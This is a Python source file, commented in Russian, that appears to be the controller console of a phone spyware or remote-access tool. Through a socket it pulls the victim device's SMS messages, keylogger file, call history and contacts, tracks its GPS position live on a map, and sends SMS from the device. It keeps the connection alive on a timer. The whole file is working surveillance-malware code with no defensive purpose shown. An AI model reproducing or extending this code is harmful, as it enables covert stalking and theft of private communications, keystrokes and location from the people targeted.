from client_window import *

import server

import json
import array
import phonenumbers
from phonenumbers import carrier
from phonenumbers.phonenumberutil import number_type
from threading import *
import time

# import send_sms_win
import error_win
import map_window





class ClientCode:

	def __init__(self, user, client_info):
		self.bufferSize = 1024*2000
		self.user = user
		self.client_info = client_info

		self.NOT_STARTED = False
		self.STARTED = True
		self.GPS_STARTED = False

		self.mapWindow = "not map"

		self.add_text_to_display = "not display"
		self.display_client_battery_lvl = "not display"

		self.NOT_COMMAND = "not command"
		self.COMMAND = self.NOT_COMMAND

		self.CONNECT_CHECK = True







	def start_client(self, add_text_to_display, display_client_battery_lvl):
		self.myTimer(40) # каждые 40 секунд просит отправить команду на клиент чтобы убедиться что соединение активно и перезапустить таймер реконекта  у клиента

		self.add_text_to_display = add_text_to_display
		self.display_client_battery_lvl = display_client_battery_lvl

		# thread = Thread(target=self.command_to_client, args=(command, add_text_to_display, ))
		# thread.start()
		self.thread = Thread(target=self.mainClientCycle)
		self.thread.start()

		# self.command_to_client(command)

	def setWindow(self, clientWindow):
		self.clientWindow = clientWindow

	def setUserSocket(self, user):
		self.user = user

	def setCommand(self, command):
		self.COMMAND = command



	def getDateFromClient(self, msg, format="standart"):
		# 1) Отправить:
		self.user.send(bytes(msg,'UTF-8')) # Конвертирует в байты
		
		# 2) Получить:
		response = self.user.recv(self.bufferSize).decode('utf-8')

		# 2.5) Возможно отформатировать в нужном стиле:
		if(format == "klog_format_text"):
			self.getReadabilityKLOG(response)
			return
		if(format == "battery_level"):
			# если текста будет много в буфер отправленно, то данные могут прейдти не сразу все, а порциями и при повторной отправки команды на сервер, может прейдти не запрошенные данные, а те что не уместились, эта проверка на это и расчитана. Ниже полное описание бага:
			# я пофиксел ещё один баг, вот какой: -- Когда отправляется запрос на список того или иного, то список мможет превышать буфер или возможной размер отправляемого пакета -- В этом случае пакет предет через секунду или с задержкой до 3-4 секунд при не стабильном соединении -- Если же не ждать пока потенциально длинный список(например детализация звонков или смс) придет полностью мог произойти баг: -- Автозапрос на уровень заряда батареии получал 2ю часть спска, которая не уместилась и отобразить на 2м дисплеи, не на том дисплеи -- я просто добавил проверку, если пришли данные не в процентах, то это отправить на главный дисплей -- И да, когда список потенциально длинный следует просто подождать 2-5 секунд, чтобы убедиться что он весь пришел -- Также процент может быть, в обычном сообщении, поэтому нужна дополнительная проверка, например, если данные пришли от - 0 до 100 числом -- В этом случае, отправлять проценты это лишнее, вот вариант проверки: -- ИСТОЧНИК: https://stackoverflow.com/questions/354038/how-do-i-check-if-a-string-represents-a-number-float-or-int -- Также процент можно оставить, но вот условие: -- Убераем все проценты из строки и проверяем str.isdigit(), если True, значит число, если там есть ещё символы, то не число, сё)))
			test = response.replace('%', '')
			test = test.replace('.', '')
			if(test.isdigit()):
				response = "Battery level: " + response
				self.printText(response, 2)
			else:
				self.printText(response, 1)
			return
		if(format == "return_only"):
			return response

		print("response: "+response)

		# 3) Распечатать:
		self.printText(response)
		return response

	def printText(self, txt, window_number=1):
		if(window_number == 1):
			self.add_text_to_display(txt)
		if(window_number == 2):
			self.display_client_battery_lvl(txt)


	def myTimer(self, sec):
		threadTimer = Thread(target=self.set_CHECK_CONNECT_True, args=(sec, ))
		threadTimer.start()


	def set_CHECK_CONNECT_True(self, sec):
		while(True):
			time.sleep(sec)
			self.CONNECT_CHECK = True





	# в методах где происходит оправка команд на сервер требуется установить try\except далее выдать окно об отключении клиента
	def help(self):
		self.printText("Доступные команды:\n\n"
				  	   "1) [send sms]          [Описание: ]\n"
				  	   "                       [Отправляет тестовое сообщение и получает тестовое сообщение =) ]\n\n"
					   "2) [get all sms]       [Описание: ]\n"
					   "                       [Получает список смс, всех.]\n\n"
					   "3) [get klog file]     [Описание: ]\n"
					   "                       [Получает содержимое файла log, который хранится на устрйстве клиента.\n"
					   "                        ТРЕБУЕТСЯ РАЗРЕШЕНИЯ НА ДОСТУП КО ВСЕМ ФАЙЛАМ, А НЕ ТОЛЬКО К МЕДИА!!!]\n\n"
					   "4) [get gps location]  [Описание: ]\n"
					   "                       [Запускает gps service, при этом запускается окно с выводом координат\n"
					   "                        на карту.]\n\n"
					   "5) [stop gps service]  [Описание: ]\n"
					   "                       [Останавливает gps service на устройстве клиента.]\n\n"
					   "6) [get call details]  [Описание: ]\n"
					   "                       [Детализация звонков которая есть в списке звонков, в том числе входящие,\n"
					   "                        исходящие и пропущенные, а также время.]\n\n"
					   "7) [get contact list]  [Описание: ]\n"
					   "                       [Получить спесок всех контактов]\n\n"
					   "9) [get battery level] [Описание: ]\n"
					   "                       [Получить текущий уровень заряда на устройстве клиента.]\n\n")








	





	def getSmsList(self, command):
		msg = json.dumps({'header' : 'SmsModule', 'body' : command})
		self.getDateFromClient(msg)

	def sendSms(self, command, phoneNumber, sms_msg):
		msg = json.dumps({'header' : 'SmsModule', 'body' : command, 'phoneNumber' : phoneNumber, 'msg' : sms_msg})
		self.getDateFromClient(msg)

	# send sms window:
	def clicked_sms_win(self, command, phone, sms):
		phoneNumber = phone.get()
		if( self.phoneNumberCheck(phoneNumber) == False):
			error_win.create_error("ERROR", "The phone number is not correct!")
		else:
			sms_msg = sms.get()
			self.sendSms(command, phoneNumber, sms_msg)

	def create_window(self, command):
		Window_sendSms = Tk()
		Window_sendSms.title("send sms")
		Window_sendSms.geometry('480x320')

		frame_phone = Frame(Window_sendSms, width=300)
		frame_phone.pack(padx=10, pady=10)
		frame_sms = Frame(Window_sendSms, width=300)
		frame_sms.pack(padx=10, pady=10)
		phone = tk.Entry(frame_phone, width=300, font="Helvetica 12")
		sms = tk.Entry(frame_sms, width=300, font="Helvetica 12")

		phone_label = tk.Label(frame_phone, text="Entry phone number:")
		sms_label = tk.Label(frame_sms, text="Entry sms text:")

		phone_label.pack(side=LEFT)
		phone.pack()
		sms_label.pack(side=LEFT)
		sms.pack()

		btn = tk.Button(Window_sendSms, text="send", command=lambda: self.clicked_sms_win(command, phone, sms), width=10, height=1)
		btn.pack(anchor=SE, padx=10)


		Window_sendSms.mainloop()
	# end sms window!







	def phoneNumberCheck(self, phoneNumber):
		try:
			return carrier._is_mobile(number_type(phonenumbers.parse(phoneNumber, None)))
		except phonenumbers.NumberParseException:
			return False










	def getReadabilityKLOG(self, klog):

		test = klog
		test = test.replace("[", "")
		test = test.replace("]", "")
		test = test.replace("\"", "")
		if(test == "Error: array equals null or array empty"):
			self.printText("File empty")
			return

		klog = klog.replace("[", "\"start\"")
		# print(klog)
		if "]" in klog:
			klog = klog.replace("]", "\"end\"")
			# print(klog)

		klog_list = klog.split('"')[1::2]
		# print(klog_list)

		for line in klog_list:
			# print(str.split(line, sep='#'))
			list_line = str.split(line, sep='#')
			
			flag = True
			if "Date:" in list_line[0]:
				flag = False

			if "start" in list_line[0]:
				flag = False

			if "end" in list_line[0]:
				flag = False

			if(flag):
				list_line[0] = "App name: "+list_line[0]

			self.printText(str(list_line))


		return

		
			


	def getKLogFile(self, command):
		msg = json.dumps({'header' : 'KLogModule', 'body' : command})
		self.getDateFromClient(msg, "klog_format_text")






	



		


	def windowGps(self):
		self.mapWindow.create_window_map()

		

	def getGPSLocation(self, command):
		# нам же не один раз координаты получить и збс, верно? :|
		# зациклим и остановим, как только таймаут лимит выйдет на ожидание ответа от сервера
		# данные в окно gps будут отправляться также с таймауотом? или окно свой таймаут иметь будет?
		# конечно можно от туда это метод перевызывать и по исчтечению таймаут лимит отключаться
		#while(True):
			# 0) Запустить GPSModule по команде:
			msg = json.dumps({'header' : 'GPSModule', 'body' : command})
			self.getDateFromClient(msg)


			# 1) создать окно карт и передать туда ответ:
			self.mapWindow = map_window.MapWindow(self.client_info, self.user)

			# 2) окно и обработка ответов с координатами будет в отдельном потоке:
			thread_map = Thread(target=self.windowGps)
			thread_map.start()



	def stopGPSModule(self, command):
		msg = json.dumps({'header' : 'GPSModule', 'body' : command})
		self.getDateFromClient(msg)
		# и желательно проверить, открыто ли окно и если да, закрыть

	# Отправляется автоматически:
	def getGPSStatus(self):
		command = "getStatusGPSModule"
		msg = json.dumps({'header' : 'GPSModule', 'body' : command})
		response = self.getDateFromClient(msg)
		return response

		# return filter(str(response), "\"")
		# return response.replace("\"", "")
		






	# пока что, код у этих метод одинаков, поэтому так, но для ясности и на всякий название метод разные
	def getCall(self, command):
		msg = json.dumps({'header' : 'CallModule', 'body' : command})
		self.getDateFromClient(msg)

	def getCallDetails(self, command):
		self.getCall(command)

	def getContactList(self, command):
		self.getCall(command)










	def getBatteryLevel(self):
		msg = json.dumps({'header' : 'BatteryModule', 'body' : ''})
		self.getDateFromClient(msg, "battery_level")

		# в случае колизии, легко проверить, те ли данные пришли что ожидались:
		# print("getBatteryLevel: "+response)
		#if(response.find("%") != -1):
		#	add_text_to_display("Battery level: "+response)
		#else:
		#	self.BAGGPS_FIX_DISPALY("BAG GPS DISPLAY:\n"+response)







			
			




# main():
	def mainClientCycle(self):
		while(True):

			if(self.COMMAND != self.NOT_COMMAND):
				self.command_to_client(self.COMMAND)
				self.COMMAND = self.NOT_COMMAND

			if(self.GPS_STARTED == self.STARTED):
				print("Coords GPS_STARTED ---- "+str(self.GPS_STARTED))
				time.sleep(3)
				msg = json.dumps({'header' : 'GPSModule', 'body' : 'getGPSArray'})
				GPSDate = self.getDateFromClient(msg, "return_only")

				if(self.mapWindow == "not map"):
					self.printText("Что-то пошло не так с окном карты, повторите команду!")
				else:
					self.mapWindow.update_coord(json.loads(GPSDate))
			
			
			if(self.CONNECT_CHECK == True):
				print("Battarey CONNECT_CHECK ---- "+str(self.CONNECT_CHECK))
				print("Connect cheker started!")
				self.getBatteryLevel()
				self.CONNECT_CHECK = False
				 




	def command_to_client(self, command):

		

		try:
			# add_text_to_display("Complite!")
			if(command == "help"):
				self.help()
				return

			if(command == "get all sms"):
				self.getSmsList(command)
				return

			if(command == "send sms"):
				self.create_window(command)
				return

			if(command == "get klog file"):
				self.getKLogFile(command)
				return

			if(command == "get gps location"):
				self.GPS_STARTED = self.STARTED
				response = self.getGPSStatus()
				response = response.replace('"', '')
				if(response == "stopped"):
					command = "start"
					self.getGPSLocation(command);
					return
			
				return

			if(command == "stop gps service"):
				self.GPS_STARTED = self.NOT_STARTED
				# response = self.getGPSStatus()
				
				# if(response == "GPSModule started successfully!"):
				command = "stop"
				self.stopGPSModule(command)
				return
				# если состояние не stopped то отобразить, скорее всего сервис запущен или gps выключен на устройстве
				
				# return

			if(command == "get call details"):
				self.getCallDetails(command)
				return

			if(command == "get contact list"):
				self.getContactList(command)
				return

			if(command == "get battery level"):
				self.getBatteryLevel()
				return
		



			# Если комманда не была активирована в одном из if то значит она неизвестна, так и пишем:
			command = "unknown command"
			if(command == "unknown command"):
				print("ERROR command not found!")
				error_win.create_error("ERROR", "command not found!")

		except Exception as e:
			print(str(e))
			server.create_server_socket(self.client_info) # пересоздание сокета в случае если соединение будет прервано, как правило на стороне хоста, хз каким ПО
			
